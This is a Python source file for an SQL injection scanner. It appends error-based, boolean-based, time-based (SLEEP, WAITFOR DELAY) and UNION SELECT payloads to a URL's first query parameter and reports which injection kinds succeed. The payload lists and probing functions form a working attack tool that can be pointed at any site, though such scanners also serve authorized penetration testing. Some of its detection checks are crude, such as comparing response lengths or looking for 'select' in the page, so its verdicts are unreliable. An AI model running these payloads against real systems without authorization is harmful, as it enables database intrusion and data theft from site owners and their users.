import requests
import time
import urllib.parse

# Common payloads
ERROR_PAYLOADS = ["'", "'--", "' OR '1'='1", "\" OR \"1\"=\"1"]
BOOLEAN_PAYLOADS = [("1' AND 1=1--", "1' AND 1=2--")]
TIME_PAYLOADS = ["1' OR SLEEP(5)--", "1'); WAITFOR DELAY '0:0:5'--"]
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT 1, 'admin', 'password'--"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; UltimateSQLiScanner/1.0)"
}

def is_vulnerable_to_error(url):
    print("\n[🔍] Checking for ERROR-BASED SQLi...")
    for payload in ERROR_PAYLOADS:
        test_url = inject_payload(url, payload)
        res = requests.get(test_url, headers=HEADERS)
        if any(err in res.text.lower() for err in ["sql syntax", "mysql", "warning", "error in your sql"]):
            print(f"[💥] Error-Based SQLi detected using payload: {payload}")
            return True
    return False

def is_vulnerable_to_boolean(url):
    print("\n[🔍] Checking for BOOLEAN-BASED SQLi...")
    true_url = inject_payload(url, BOOLEAN_PAYLOADS[0][0])
    false_url = inject_payload(url, BOOLEAN_PAYLOADS[0][1])

    res_true = requests.get(true_url, headers=HEADERS).text
    res_false = requests.get(false_url, headers=HEADERS).text

    if len(res_true) != len(res_false):
        print(f"[💥] Boolean-Based SQLi detected using payloads:\n [+] TRUE: {BOOLEAN_PAYLOADS[0][0]}\n [-] FALSE: {BOOLEAN_PAYLOADS[0][1]}")
        return True
    return False

def is_vulnerable_to_time(url):
    print("\n[🔍] Checking for TIME-BASED SQLi...")
    for payload in TIME_PAYLOADS:
        test_url = inject_payload(url, payload)
        start = time.time()
        try:
            res = requests.get(test_url, headers=HEADERS, timeout=10)
            delay = time.time() - start
            if delay >= 5:
                print(f"[💥] Time-Based SQLi detected with payload: {payload}")
                return True
        except requests.exceptions.Timeout:
            print(f"[💥] Time-Based SQLi (timeout) detected with payload: {payload}")
            return True
    return False

def is_vulnerable_to_union(url):
    print("\n[🔍] Checking for UNION-BASED SQLi...")
    for payload in UNION_PAYLOADS:
        test_url = inject_payload(url, payload)
        res = requests.get(test_url, headers=HEADERS)
        if "union" in res.text.lower() or "select" in res.text.lower():
            print(f"[💥] Union-Based SQLi might be detected with payload: {payload}")
            return True
    return False

def inject_payload(url, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    if not query:
        print("[⚠️] No parameters found in the URL to inject.")
        return url

    # Inject into the first param
    first_param = list(query.keys())[0]
    query[first_param] = query[first_param][0] + payload
    new_query = urllib.parse.urlencode(query, doseq=True)
    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


def sql_injection_checker(url: str):
    if not url:
        return {"error": "URL is None or empty."}
    url = url.strip()

    if "?" not in url or "=" not in url:
        return {"error": "Invalid URL. No parameters found."}

    results = {
        "url": url,
        "error_based": False,
        "boolean_based": False,
        "time_based": False,
        "union_based": False,
        "vulnerable": False
    }

    if is_vulnerable_to_error(url):
        results["error_based"] = True
        results["vulnerable"] = True
    if is_vulnerable_to_boolean(url):
        results["boolean_based"] = True
        results["vulnerable"] = True
    if is_vulnerable_to_time(url):
        results["time_based"] = True
        results["vulnerable"] = True
    if is_vulnerable_to_union(url):
        results["union_based"] = True
        results["vulnerable"] = True

    return results